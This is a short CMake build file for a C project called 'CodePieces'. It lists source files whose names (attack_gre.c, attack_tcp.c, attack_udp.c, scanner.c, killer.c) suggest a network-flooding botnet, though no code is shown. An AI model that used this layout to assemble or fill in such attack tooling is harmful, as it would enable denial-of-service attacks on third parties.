cmake_minimum_required(VERSION 3.10)
project(CodePieces C)

set(CMAKE_C_STANDARD 99)

add_executable(CodePieces main.c
        attack.c
        attack.h
        attack_app.c
        attack_gre.c
        attack_tcp.c
        attack_udp.c
        checksum.c
        checksum.h
        includes.h
        killer.c
        killer.h
        protocol.h
        rand.c
        rand.h
        resolv.c
        resolv.h
        scanner.c
        scanner.h
        table.c
        table.h
        util.c
        util.h)